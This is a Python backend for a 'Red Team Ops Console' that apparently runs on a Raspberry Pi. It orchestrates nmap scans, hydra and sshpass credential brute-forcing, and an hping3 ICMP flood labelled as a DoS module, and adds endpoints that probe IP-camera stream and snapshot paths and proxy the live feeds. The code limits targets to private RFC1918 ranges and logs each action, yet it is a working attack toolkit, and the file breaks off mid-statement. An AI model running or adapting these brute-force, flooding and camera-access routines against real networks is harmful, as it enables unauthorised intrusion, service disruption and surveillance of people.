#!/usr/bin/env python3
"""Red Team Ops Console — backend (Raspberry Pi).

Zero-dependency implementation of the control protocol in WEB.MD:
  - serves the static frontend/ at /
  - REST control  : GET /api/health, GET /api/status,
                    POST /api/ops/{module}/start|stop, POST /api/ops/stop_all
  - telemetry     : WebSocket /api/stream  (log / result / status)

Implemented engines: scan_ip, scan_port (nmap), brute (hydra/sshpass), dos (hping3 ICMP).
All modules are restricted server-side to RFC1918 targets. Engagement VQEC-RT-01.

Contract source of truth: WEB.MD. snake_case fields, same-origin, no CORS.
"""

import os
import re
import sys
import json
import time
import uuid
import base64
import struct
import socket
import hashlib
import threading
import subprocess
import tempfile
import xml.etree.ElementTree as ET
import urllib.request
import urllib.error
from urllib.parse import urlparse, parse_qs
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
FRONTEND = os.path.join(ROOT, "frontend")
LOGDIR = os.path.join(ROOT, "logs")
LOGFILE = os.path.join(LOGDIR, "session.ndjson")

ENGAGEMENT = "VQEC-RT-01"
MODULES = ("scan_ip", "scan_port", "brute", "dos")
PORT = int(os.environ.get("RTOPS_PORT", "8080"))
NMAP = os.environ.get("RTOPS_NMAP", "nmap")
HYDRA = os.environ.get("RTOPS_HYDRA", "hydra")
WORDLISTS = os.path.join(HERE, "wordlists")
# Services the brute engine knows how to attack, probed in this order.
BRUTE_SERVICES = [("rtsp", 554)]
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
START_TS = time.time()

os.makedirs(LOGDIR, exist_ok=True)

# Last inputs seen, returned in GET /api/status.config so a reload re-hydrates.
LAST_CFG = {"scan_range": "192.168.1.0/24", "target": "192.168.1.30"}

# --------------------------------------------------------------- validation
_IPV4 = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$")
_CIDR = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/(\d{1,2})$")


def valid_ipv4(s):
    m = _IPV4.match((s or "").strip())
    return bool(m) and all(0 <= int(x) <= 255 for x in m.groups())


def valid_range(s):
    s = (s or "").strip()
    if valid_ipv4(s):
        return True
    m = _CIDR.match(s)
    if not m:
        return False
    return all(0 <= int(x) <= 255 for x in m.groups()[:4]) and 0 <= int(m.group(5)) <= 32


def is_private_ipv4(s):
    m = _IPV4.match((s or "").strip())
    if not m:
        return False
    o = [int(x) for x in m.groups()]
    if any(x > 255 for x in o):
        return False
    return o[0] == 10 or (o[0] == 172 and 16 <= o[1] <= 31) or (o[0] == 192 and o[1] == 168)


def is_private_range(s):
    # The network portion (before the /) must be RFC1918.
    return is_private_ipv4((s or "").strip().split("/")[0])


# ------------------------------------------------------------------- audit
_log_lock = threading.Lock()


def audit(entry):
    """Append one JSON record to logs/session.ndjson (WEB.MD §8)."""
    rec = dict(entry)
    rec.setdefault("ts", int(time.time()))
    try:
        line = json.dumps(rec, ensure_ascii=False)
        with _log_lock:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except Exception:
        pass


# ------------------------------------------------------------- telemetry hub
class WSClient:
    """A single WebSocket connection (server->client text frames)."""

    def __init__(self, conn):
        self.conn = conn
        self.lock = threading.Lock()
        self.open = True

    def _send(self, opcode, payload):
        n = len(payload)
        frame = bytearray([0x80 | opcode])
        if n < 126:
            frame.append(n)
        elif n < 65536:
            frame.append(126)
            frame += struct.pack(">H", n)
        else:
            frame.append(127)
            frame += struct.pack(">Q", n)
        frame += payload
        with self.lock:
            if not self.open:
                return
            self.conn.sendall(frame)

    def send_text(self, s):
        self._send(0x1, s.encode("utf-8"))

    def pong(self, payload):
        self._send(0xA, payload)

    def close(self):
        with self.lock:
            if self.open:
                try:
                    self.conn.sendall(bytes([0x88, 0x00]))  # close frame
                except Exception:
                    pass
                self.open = False


class Hub:
    def __init__(self):
        self.clients = set()
        self.lock = threading.Lock()

    def add(self, c):
        with self.lock:
            self.clients.add(c)

    def remove(self, c):
        with self.lock:
            self.clients.discard(c)

    def broadcast(self, msg):
        data = json.dumps(msg, ensure_ascii=False)
        with self.lock:
            targets = list(self.clients)
        for c in targets:
            try:
                c.send_text(data)
            except Exception:
                self.remove(c)


HUB = Hub()


# ------------------------------------------------------------- nmap parsing
def classify(line):
    """Pick the useful nmap stdout/stderr lines to stream as telemetry."""
    l = line.strip()
    if not l:
        return None
    if "Discovered open port" in l:
        return ("ok", l.split("Discovered ", 1)[1])
    if l.startswith("Nmap scan report for"):
        if "[host down]" in l:
            return None          # don't flood the console with dead hosts
        return ("ok", "host sống: " + l.replace("Nmap scan report for ", ""))
    if "Host is up" in l:
        return ("info", l)
    if "/tcp" in l and "open" in l and l[:1].isdigit():
        return ("ok", l)
    if "% done" in l or "Timing:" in l:
        return ("info", l)
    if l.startswith("Starting Nmap") or l.startswith("Completed") or "Nmap done" in l:
        return ("info", l)
    return None


def parse_hosts(xml_path):
    hosts = []
    try:
        root = ET.parse(xml_path).getroot()
    except Exception:
        return {"hosts": []}, "0 host sống"
    for h in root.findall("host"):
        st = h.find("status")
        if st is None or st.get("state") != "up":
            continue
        ip = mac = vendor = hostname = ""
        rtt = ""
        for a in h.findall("address"):
            t = a.get("addrtype")
            if t == "ipv4":
                ip = a.get("addr", "")
            elif t == "mac":
                mac = a.get("addr", "")
                vendor = a.get("vendor", "") or ""
        hn = h.find("hostnames")
        if hn is not None:
            first = hn.find("hostname")
            if first is not None:
                hostname = first.get("name", "")
        times = h.find("times")
        if times is not None and times.get("srtt"):
            try:
                rtt = round(int(times.get("srtt")) / 1000)  # microseconds -> ms
            except Exception:
                rtt = ""
        hosts.append({"ip": ip, "hostname": hostname, "mac": mac, "vendor": vendor, "rtt_ms": rtt})
    return {"hosts": hosts}, f"{len(hosts)} host sống"


def parse_ports(xml_path):
    ports = []
    try:
        root = ET.parse(xml_path).getroot()
    except Exception:
        return {"open_ports": []}, "0 cổng mở"
    host = root.find("host")
    if host is not None:
        ps = host.find("ports")
        if ps is not None:
            for p in ps.findall("port"):
                stt = p.find("state")
                if stt is None or stt.get("state") != "open":
                    continue
                svc = p.find("service")
                name = svc.get("name", "") if svc is not None else ""
                product = svc.get("product", "") if svc is not None else ""
                version = svc.get("version", "") if svc is not None else ""
                ver = " ".join(x for x in (product, version) if x).strip()
                ports.append({
                    "port": int(p.get("portid")),
                    "proto": p.get("protocol", "tcp"),
                    "service": name,
                    "version": ver,
                })
    ports.sort(key=lambda x: x["port"])
    if ports:
        top = " · ".join(f"{p['port']}/{p['service'] or p['proto']}" for p in ports[:3])
        summary = f"{len(ports)} cổng mở: {top}"
    else:
        summary = "0 cổng mở"
    return {"open_ports": ports}, summary


# --privileged: nmap decides privilege from euid==0 only, so it ignores the
# CAP_NET_RAW the systemd unit grants. This flag forces raw-socket mode, which
# lets -sn do ARP discovery -> MAC address + vendor on the local segment.
def cmd_scan_ip(scan_range):
    return [NMAP, "--privileged", "-sn", "-v", "--stats-every", "2s", scan_range]


def cmd_scan_port(target):
    # -F = fast scan, only the ~100 most common ports (no -sV version probe) so
    # it finishes in a couple of seconds instead of scanning everything.
    return [NMAP, "--privileged", "-sT", "-T4", "-v", "-F", "--host-timeout", "60s", target]


def tcp_open(host, port, timeout=0.7):
    try:
        with socket.create_connection((host, port), timeout):
            return True
    except OSError:
        return False


def detect_brute_service(target):
    """Pick the first reachable bruteforce-able service on the target (default ssh)."""
    for svc, port in BRUTE_SERVICES:
        if tcp_open(target, port):
            return svc, port
    return "ssh", 22


def cmd_brute(target, service, port):
    users = os.path.join(WORDLISTS, "users.txt")
    passwords = os.path.join(WORDLISTS, "passwords.txt")
    # -u  : try each password across all users (catches reused weak passwords fast)
    # -f  : stop at the first valid pair · -I ignore restore file · -w 5 per-connect wait
    # SSH (esp. modern OpenSSH) refuses parallel connects, so use one task; others 4.
    tasks = "1" if service == "ssh" else "4"
    if service == "http-get":
        return [HYDRA, "-L", users, "-P", passwords, "-u", "-t", tasks, "-f", "-I", "-w", "5",
                f"http-get://{target}:{port}/"]
    return [HYDRA, "-L", users, "-P", passwords, "-u", "-t", tasks, "-f", "-I", "-w", "5",
            f"{service}://{target}:{port}"]


# ----------------------------------------------------------------- engine
class Job:
    def __init__(self, module):
        self.module = module
        self.state = "idle"       # idle | running | error
        self.proc = None
        self.since = None
        self.summary = None
        self.job_id = None
        self.stop_flag = False
        self.thread = None


def _err(code, message, module, request_id):
    return {"request_id": request_id, "accepted": False, "module": module,
            "error": {"code": code, "message": message}}


class Engine:
    def __init__(self):
        self.jobs = {m: Job(m) for m in MODULES}
        self.lock = threading.Lock()

    # -- telemetry emitters -------------------------------------------------
    def _emit_log(self, module, level, text):
        HUB.broadcast({"type": "log", "ts": int(time.time()), "module": module,
                       "level": level, "text": text})

    def _emit_result(self, module, data):
        HUB.broadcast({"type": "result", "ts": int(time.time()), "module": module, "data": data})
        audit({"dir": "out", "type": "result", "module": module, "data": data})

    def _emit_status(self, module, state, summary=None):
        msg = {"type": "status", "ts": int(time.time()), "module": module, "state": state}
        if summary is not None:
            msg["summary"] = summary
        HUB.broadcast(msg)
        audit({"dir": "out", "type": "status", "module": module, "state": state, "summary": summary})

    # -- lifecycle ----------------------------------------------------------
    def start(self, module, params, request_id):
        if module not in MODULES:
            return 404, _err("invalid_target", "module không hợp lệ", module, request_id)

        job = self.jobs[module]
        with self.lock:
            if job.state == "running":
                return 409, _err("busy", "module đang chạy", module, request_id)

        scan_range = (params.get("scan_range") or "").strip()
        target = (params.get("target") or "").strip()
        if scan_range:
            LAST_CFG["scan_range"] = scan_range
        if target:
            LAST_CFG["target"] = target

        # DoS — hping3 ICMP flood, rate≈2000pps. RFC1918-scoped, lab/engagement only.
        if module == "dos":
            if not valid_ipv4(target):
                return 400, _err("invalid_target", "IP mục tiêu sai định dạng", module, request_id)
            if not is_private_ipv4(target):
                return 403, _err("out_of_scope", f"Mục tiêu {target or '(trống)'} ngoài RFC1918", module, request_id)
            job_id = "job-" + uuid.uuid4().hex[:6]
            with self.lock:
                job.state = "running"
                job.since = int(time.time())
                job.job_id = job_id
                job.summary = "running…"
                job.stop_flag = False
                job.scan_target = target
            job.thread = threading.Thread(target=self._run_dos, args=(job, target), daemon=True)
            job.thread.start()
            audit({"dir": "in", "request_id": request_id, "module": module, "action": "start",
                   "params": {"target": target}, "accepted": True, "job_id": job_id})
            return 200, {"request_id": request_id, "accepted": True, "module": module,
                         "state": "running", "job_id": job_id}

        # Brute force (hydra) — scope-restricted to RFC1918 like every attack module (WEB.MD §7).
        if module == "brute":
            if not valid_ipv4(target):
                return 400, _err("invalid_target", "IP mục tiêu sai định dạng", module, request_id)
            if not is_private_ipv4(target):
                return 403, _err("out_of_scope", f"Mục tiêu {target} ngoài RFC1918", module, request_id)
            service, port = detect_brute_service(target)
            job_id = "job-" + uuid.uuid4().hex[:6]
            with self.lock:
                job.state = "running"
                job.since = int(time.time())
                job.job_id = job_id
                job.summary = "running…"
                job.stop_flag = False
                job.scan_target = target
            # SSH uses the OpenSSH client (handles Dropbear routers that hydra's libssh can't);
            # other services use hydra.
            if service == "ssh":
                job.thread = threading.Thread(target=self._run_ssh_brute, args=(job, target, port), daemon=True)
            else:
                job.thread = threading.Thread(target=self._run_brute, args=(job, target, service, port), daemon=True)
            job.thread.start()
            audit({"dir": "in", "request_id": request_id, "module": module, "action": "start",
                   "params": {"target": target, "service": service}, "accepted": True, "job_id": job_id})
            return 200, {"request_id": request_id, "accepted": True, "module": module,
                         "state": "running", "job_id": job_id}

        # Recon modules.
        if module == "scan_ip":
            if not valid_range(scan_range):
                return 400, _err("invalid_target", "Dải quét sai định dạng (IPv4 hoặc CIDR)", module, request_id)
            if not is_private_range(scan_range):
                return 403, _err("out_of_scope", f"Dải {scan_range} ngoài RFC1918", module, request_id)
            cmd, parser = cmd_scan_ip(scan_range), parse_hosts
        else:  # scan_port
            if not valid_ipv4(target):
                return 400, _err("invalid_target", "IP mục tiêu sai định dạng", module, request_id)
            if not is_private_ipv4(target):
                return 403, _err("out_of_scope", f"Mục tiêu {target} ngoài RFC1918", module, request_id)
            cmd, parser = cmd_scan_port(target), parse_ports

        job_id = "job-" + uuid.uuid4().hex[:6]
        with self.lock:
            job.state = "running"
            job.since = int(time.time())
            job.job_id = job_id
            job.summary = "running…"
            job.stop_flag = False
            job.scan_target = target        # so scan_port result can name the IP it scanned
        job.thread = threading.Thread(target=self._run_scan, args=(job, cmd, parser), daemon=True)
        job.thread.start()

        audit({"dir": "in", "request_id": request_id, "module": module, "action": "start",
               "params": params, "accepted": True, "job_id": job_id})
        return 200, {"request_id": request_id, "accepted": True, "module": module,
                     "state": "running", "job_id": job_id}

    def _run_scan(self, job, cmd, parser):
        module = job.module
        self._emit_log(module, "info", "$ " + " ".join(cmd))
        fd, xml_path = tempfile.mkstemp(suffix=".xml", prefix="rtops_")
        os.close(fd)
        full = list(cmd) + ["-oX", xml_path]
        try:
            proc = subprocess.Popen(full, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1)
            job.proc = proc
            for line in proc.stdout:
                if job.stop_flag:
                    break
                c = classify(line)
                if c:
                    self._emit_log(module, c[0], c[1])
            proc.wait()

            if job.stop_flag:
                self._emit_log(module, "warn", "đã dừng theo yêu cầu")
            else:
                data, summary = parser(xml_path)
                if module == "scan_port":
                    data = {"target": getattr(job, "scan_target", ""), **data}
                self._emit_result(module, data)
                self._emit_log(module, "ok", summary)
        except FileNotFoundError:
            self._emit_log(module, "error", "không tìm thấy nmap trên Pi")
            self._emit_status(module, "error", "nmap missing")
        except Exception as e:  # noqa: BLE001
            self._emit_log(module, "error", f"engine_error: {e}")
        finally:
            try:
                os.remove(xml_path)
            except OSError:
                pass
            with self.lock:
                job.state = "idle"
                job.proc = None
                job.summary = None
                job.since = None
            self._emit_status(module, "idle", "Idle")

    def _run_brute(self, job, target, service, port):
        module = "brute"
        cmd = cmd_brute(target, service, port)
        self._emit_log(module, "info", f"$ hydra -L users -P passwords -f {service}://{target}:{port}")
        self._emit_status(module, "running", f"brute {service}…")
        found = []
        # Matches hydra success line: [22][ssh] host: 1.2.3.4   login: admin   password: 1234
        rx = re.compile(r"\[\d+\]\[([\w-]+)\]\s+host:\s*(\S+)\s+login:\s*(.*?)\s+password:\s*(.*)$")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1)
            job.proc = proc
            for line in proc.stdout:
                if job.stop_flag:
                    break
                line = line.rstrip()
                m = rx.search(line)
                if m:
                    cred = {"service": m.group(1), "username": m.group(3), "password": m.group(4)}
                    found.append(cred)
                    self._emit_log(module, "ok", f"TÌM THẤY {cred['username']}:{cred['password']} @ {service}")
                elif line.startswith("[ERROR]") or "could not connect" in line.lower():
                    self._emit_log(module, "error", line)
                elif line.startswith("[WARNING]"):
                    self._emit_log(module, "warn", line)
                elif "data attack" in line or "valid password" in line or line.startswith("Hydra "):
                    self._emit_log(module, "info", line)
            proc.wait()

            if job.stop_flag:
                self._emit_log(module, "warn", "đã dừng theo yêu cầu")
            else:
                self._emit_result(module, {"service": service, "target": target, "found": found})
                if found:
                    self._emit_log(module, "ok", f"{len(found)} thông tin đăng nhập hợp lệ trên {service}")
                else:
                    self._emit_log(module, "warn", f"không tìm thấy đăng nhập hợp lệ ({service})")
        except FileNotFoundError:
            self._emit_log(module, "error", "không tìm thấy hydra trên Pi")
            self._emit_status(module, "error", "hydra missing")
        except Exception as e:  # noqa: BLE001
            self._emit_log(module, "error", f"engine_error: {e}")
        finally:
            with self.lock:
                job.state = "idle"
                job.proc = None
                job.summary = None
                job.since = None
            self._emit_status(module, "idle", "Idle")

    @staticmethod
    def _wordlist(name):
        try:
            with open(os.path.join(WORDLISTS, name), encoding="utf-8", errors="ignore") as f:
                return [ln.strip() for ln in f if ln.strip()]
        except OSError:
            return []

    @staticmethod
    def _ssh_try(target, port, user, pw):
        """One SSH auth attempt via the OpenSSH client (works where hydra's libssh
        fails against Dropbear routers). Returns 'ok' | 'fail' | 'locked' | 'timeout'."""
        cmd = ["sshpass", "-p", pw, "ssh", "-p", str(port),
               "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
               "-o", "ConnectTimeout=8", "-o", "NumberOfPasswordPrompts=1",
               "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
               "-o", "LogLevel=ERROR", f"{user}@{target}", "echo RTOPS_AUTH_OK"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        except subprocess.TimeoutExpired:
            return "timeout"
        out = ((r.stdout or "") + (r.stderr or ""))
        low = out.lower()
        if "RTOPS_AUTH_OK" in out or r.returncode == 0:
            return "ok"
        if "lock" in low or "too many" in low or "try again" in low:
            return "locked"
        return "fail"

    def _run_ssh_brute(self, job, target, port):
        module = "brute"
        users = self._wordlist("users.txt")
        passwords = self._wordlist("passwords.txt")
        total = len(users) * len(passwords)
        self._emit_log(module, "info",
                       f"$ ssh-brute (OpenSSH client) {target}:{port} · {len(users)}u × {len(passwords)}p")
        self._emit_status(module, "running", "brute ssh…")
        found, tried, backoffs, done = [], 0, 0, False
        try:
            for pw in passwords:
                if done or job.stop_flag:
                    break
                for user in users:
                    if job.stop_flag:
                        done = True
                        break
                    tried += 1
                    res = self._ssh_try(target, port, user, pw)
                    if res == "locked":
                        backoffs += 1
                        if backoffs > 3:
                            self._emit_log(module, "warn",
                                           "router khóa brute-force liên tục — dừng (mục tiêu được bảo vệ tốt)")
                            done = True
                            break
                        self._emit_log(module, "warn",
                                       f"router khóa brute-force, chờ 135s rồi thử lại (lần {backoffs})…")
                        for _ in range(135):
                            if job.stop_flag:
                                break
                            time.sleep(1)
                        if job.stop_flag:
                            done = True
                            break
                        res = self._ssh_try(target, port, user, pw)
                    if res == "ok":
                        found.append({"service": "ssh", "username": user, "password": pw})
                        self._emit_log(module, "ok", f"TÌM THẤY {user}:{pw}")
                        done = True
                        break
                    if tried % 10 == 0:
                        self._emit_log(module, "info", f"đã thử {tried}/{total}…")
            if job.stop_flag:
                self._emit_log(module, "warn", "đã dừng theo yêu cầu")
            else:
                self._emit_result(module, {"service": "ssh", "target": target, "found": found})
                self._emit_log(module, "ok" if found else "warn",
                               f"{len(found)} đăng nhập hợp lệ" if found
                               else "không tìm thấy đăng nhập hợp lệ (ssh)")
        except FileNotFoundError:
            self._emit_log(module, "error", "thiếu sshpass/ssh trên Pi")
            self._emit_status(module, "error", "sshpass missing")
        except Exception as e:  # noqa: BLE001
            self._emit_log(module, "error", f"engine_error: {e}")
        finally:
            with self.lock:
                job.state = "idle"
                job.proc = None
                job.summary = None
                job.since = None
            self._emit_status(module, "idle", "Idle")

    def _run_dos(self, job, target):
        module = "dos"
        # -i u500 = 1 packet every 500 µs → ≈2000 pps ICMP
        # stdout/stderr → DEVNULL to avoid pipe-buffer blocking; we track via elapsed time.
        cmd = ["hping3", "--icmp", "-i", "u500", target]
        self._emit_log(module, "warn", f"$ hping3 --icmp -i u500 {target}  (≈2000 pps, RFC1918)")
        self._emit_status(module, "running", f"ICMP → {target}…")
        t_start = time.time()
        t_last_log = 0.0
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            job.proc = proc
            while proc.poll() is None:
                if job.stop_flag:
                    break
                time.sleep(0.5)
                elapsed = time.time() - t_start
                est = int(elapsed * 2000)
                self._emit_status(module, "running", f"~{est:,} pkt → {target}")
                if elapsed - t_last_log >= 3.0:
                    self._emit_log(module, "info", f"~{est:,} gói ICMP → {target} ({int(elapsed)}s)")
                    t_last_log = elapsed
            try:
                proc.terminate()
            except Exception:
                pass
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            elapsed = time.time() - t_start
            est_total = int(elapsed * 2000)
            if job.stop_flag:
                self._emit_log(module, "warn", f"đã dừng · ~{est_total:,} gói ICMP → {target}")
            else:
                self._emit_result(module, {"target": target, "estimated_sent": est_total})
                self._emit_log(module, "ok", f"hoàn thành: ~{est_total:,} gói ICMP → {target}")
        except FileNotFoundError:
            self._emit_log(module, "error", "không tìm thấy hping3 trên Pi — cài: sudo apt install hping3")
            self._emit_status(module, "error", "hping3 missing")
        except Exception as e:  # noqa: BLE001
            self._emit_log(module, "error", f"engine_error: {e}")
        finally:
            with self.lock:
                job.state = "idle"
                job.proc = None
                job.summary = None
                job.since = None
            self._emit_status(module, "idle", "Idle")

    def stop(self, module, request_id):
        if module not in MODULES:
            return 404, _err("invalid_target", "module không hợp lệ", module, request_id)
        job = self.jobs[module]
        job.stop_flag = True
        p = job.proc
        if p and p.poll() is None:
            try:
                p.terminate()
            except Exception:
                pass
        with self.lock:
            job.state = "idle"
        audit({"dir": "in", "request_id": request_id, "module": module, "action": "stop", "accepted": True})
        return 200, {"request_id": request_id, "accepted": True, "module": module, "state": "idle"}

    def stop_all(self, request_id):
        for m in MODULES:
            self.stop(m, request_id)
        audit({"dir": "in", "request_id": request_id, "action": "stop_all", "accepted": True})
        return 200, {"request_id": request_id, "accepted": True}

    def snapshot(self):
        mods = {}
        with self.lock:
            for m, job in self.jobs.items():
                d = {"state": job.state}
                if job.state == "running":
                    if job.since:
                        d["since"] = job.since
                    if job.summary:
                        d["summary"] = job.summary
                mods[m] = d
        return {"engagement": ENGAGEMENT, "modules": mods,
                "config": {"scan_range": LAST_CFG["scan_range"], "target": LAST_CFG["target"]}}


ENGINE = Engine()


# ------------------------------------------------------------------ HTTP
class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def __init__(self, *a, **k):
        super().__init__(*a, directory=FRONTEND, **k)

    def log_message(self, *a):  # keep stdout clean (journald already timestamps)
        pass

    def end_headers(self):
        # Force revalidation for JS/CSS so browsers always get the latest version
        path = urlparse(self.path).path
        if path.endswith((".js", ".css", ".html")) or path == "/":
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
            self.send_header("Pragma", "no-cache")
        super().end_headers()

    # -- helpers ------------------------------------------------------------
    def _body(self):
        try:
            n = int(self.headers.get("Content-Length", "0") or "0")
            raw = self.rfile.read(n) if n else b""
            return json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            return {}

    def _json(self, code, obj):
        data = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    # -- routing ------------------------------------------------------------
    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/api/health":
            return self._json(200, {"status": "ok", "version": "1.0",
                                    "uptime_s": int(time.time() - START_TS)})
        if path == "/api/status":
            return self._json(200, ENGINE.snapshot())
        if path == "/api/stream":
            if (self.headers.get("Upgrade", "").lower() == "websocket"):
                return self._ws()
            return self._json(400, {"error": "expected websocket upgrade"})
        if path == "/api/cam/probe":
            return self._cam_probe_ep()
        if path == "/api/cam/stream":
            return self._cam_stream_ep()
        if path == "/api/cam/fmp4":
            return self._cam_fmp4_ep()
        return super().do_GET()

    def do_POST(self):
        path = urlparse(self.path).path
        m = re.match(r"^/api/ops/([a-z_]+)/(start|stop)$", path)
        if m:
            body = self._body()
            rid = body.get("request_id") or uuid.uuid4().hex
            if m.group(2) == "start":
                code, resp = ENGINE.start(m.group(1), body.get("params") or {}, rid)
            else:
                code, resp = ENGINE.stop(m.group(1), rid)
            return self._json(code, resp)
        if path == "/api/ops/stop_all":
            body = self._body()
            rid = body.get("request_id") or uuid.uuid4().hex
            code, resp = ENGINE.stop_all(rid)
            return self._json(code, resp)
        return self._json(404, {"error": "not found"})

    # -- camera proxy -------------------------------------------------------
    def _cam_probe_ep(self):
        """GET /api/cam/probe?host=IP&user=USER&pass=PASS
        Tries common IP-camera stream and snapshot paths; returns the first
        working one so the frontend knows how to display the feed."""
        qs = parse_qs(urlparse(self.path).query)
        host = (qs.get("host", [""])[0]).strip()
        user = (qs.get("user", [""])[0]).strip()
        pw   = (qs.get("pass", [""])[0]).strip()
        if not valid_ipv4(host) or not is_private_ipv4(host):
            return self._json(400, {"error": "host không hợp lệ hoặc ngoài RFC1918"})

        auth = ("Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode()) if user else None

        def probe(path, timeout=3):
            req = urllib.request.Request(f"http://{host}{path}")
            if auth:
                req.add_header("Authorization", auth)
            try:
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    ct = r.headers.get("Content-Type", "")
                    head = r.read(32)
                return ct, head
            except Exception:
                return "", b""

        # Check RTSP port 554 first — if open, ffmpeg can transcode it
        import socket as _sock
        try:
            s = _sock.create_connection((host, 554), timeout=2)
            s.close()
            rtsp_url = f"rtsp://{user}:{pw}@{host}:554/" if user else f"rtsp://{host}:554/"
            return self._json(200, {"type": "rtsp", "path": rtsp_url})
        except OSError:
            pass

        for path in ("/video.mjpeg", "/mjpg/video.mjpeg", "/mjpeg", "/stream",
                     "/videostream.cgi", "/axis-cgi/mjpg/video.cgi"):
            ct, _ = probe(path)
            if "multipart" in ct.lower():
                return self._json(200, {"type": "mjpeg", "path": path})

        for path in ("/snapshot.jpg", "/image.jpg", "/snapshot.cgi",
                     "/snapshot", "/jpg/image.jpg", "/cgi-bin/snapshot.jpg",
                     "/tmpfs/auto.jpg", "/capture", "/webcapture.jpg"):
            ct, head = probe(path)
            if "image" in ct.lower() or head[:2] == b"\xff\xd8":
                return self._json(200, {"type": "snapshot", "path": path})

        ct, _ = probe("/")
        if ct:
            return self._json(200, {"type": "webpage", "path": "/"})

        return self._json(200, {"type": "none"})

    def _cam_stream_ep(self):
        """GET /api/cam/stream?host=IP&user=USER&pass=PASS&path=PATH
        Proxies the upstream camera stream (MJPEG, JPEG snapshot, or RTSP via ffmpeg).
        Only RFC1918 hosts are allowed to prevent SSRF."""
        qs = parse_qs(urlparse(self.path).query)
        host     = (qs.get("host", [""])[0]).strip()
        user     = (qs.get("user", [""])[0]).strip()
        pw       = (qs.get("pass", [""])[0]).strip()
        cam_path = (qs.get("path", ["/snapshot.jpg"])[0]).strip()
        if not valid_ipv4(host) or not is_private_ipv4(host):
            return self._json(400, {"error": "host không hợp lệ hoặc ngoài RFC1918"})

        # RTSP path: transcode with ffmpeg → MJPEG multipart stream
        if cam_path.startswith("rtsp://"):
            boundary = "frame"
            self.send_response(200)
            self.send_header("Content-Type", f"multipart/x-mixed-replace;boundary={boundary}")
            self.send_header("Cache-Control", "no-store, no-cache")
            self.send_header("Connection", "close")
            self.end_headers()
            self.close_connection = True
            cmd = [
                "ffmpeg", "-loglevel", "quiet",
                "-fflags", "nobuffer",
                "-flags", "low_delay",
                "-probesize", "32",
                "-analyzeduration", "0",
                "-rtsp_transport", "tcp",
                "-i", cam_path,
                "-vf", "fps=20,scale=640:-1,vflip,hflip",
                "-q:v", "3",
                "-f", "image2pipe",
                "-vcodec", "mjpeg",
                "pipe:1"
            ]
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                buf = b""
                SOI = b"\xff\xd8"
                EOI = b"\xff\xd9"
                while True:
                    chunk = proc.stdout.read(16384)
                    if not chunk:
                        break
                    buf += chunk
                    while True:
                        s = buf.find(SOI)
                        if s == -1:
                            buf = b""
                            break
                        e = buf.find(EOI, s + 2)
                        if e == -1:
                            buf = buf[s:]
                            break
                        frame = buf[s:e + 2]
                        buf = buf[e + 2:]
                        try:
                            header = (
                                f"--{boundary}\r\n"
                                f"Content-Type: image/jpeg\r\n"
                                f"Content-Length: {len(frame)}\r\n\r\n"
                            ).encode()
                            self.wfile.write(header + frame + b"\r\n")
                            self.wfile.flush()
                        except (BrokenPipeError, ConnectionResetError, OSError):
                            proc.terminate()
                            return
                proc.wait()
            except Exception:
                return
            return

        if not cam_path.startswith("/"):
            cam_path = "/" + cam_path

        req = urllib.request.Request(f"http://{host}{cam_path}")
        if user:
            req.add_header("Authorization",
                           "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            ct   = resp.headers.get("Content-Type", "image/jpeg")
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Cache-Control", "no-store, no-cache")
            if "multipart" in ct.lower():
                self.send_header("Connection", "close")
                self.end_headers()
                self.close_connection = True
                while True:
                    chunk = resp.read(16384)
                    if not chunk:
                        break
                    try:
                        self.wfile.write(chunk)
                        self.wfile.flush()
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        break
            else:
                data = resp.read()
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            resp.close()
        except urllib.error.HTTPError as e:
            self._json(e.code, {"error": f"camera HTTP {e.code}"})
        except Exception as e:  # noqa: BLE001
            self._json(502, {"error": str(e)})

    def _cam_fmp4_ep(self):
        """GET /api/cam/fmp4?host=IP&user=USER&pass=PASS&path=RTSP_URL
        Streams RTSP via ffmpeg as fragmented MP4 (H.264 baseline, ultrafast).
        Browser feeds the chunked response into MSE for hardware-accelerated playback."""
        qs = parse_qs(urlparse(self.path).query)
        host     = (qs.get("host", [""])[0]).strip()
        cam_path = (qs.get("path", [""])[0]).strip()
        if not valid_ipv4(host) or not is_private_ipv4(host):
            return self._json(400, {"error": "host không hợp lệ hoặc ngoài RFC1918"})
        if not cam_path.startswith("rtsp://"):
            return self._json(400, {"error": "chỉ hỗ trợ RTSP"})
        self.send_response(200)
        self.send_header("Content-Type", "video/mp4")
        self.send_header("Cache-Control", "no-store, no-cache")
        self.send_header("Connection", "close")
        self.end_headers()
        self.close_connection = True
        cmd = [
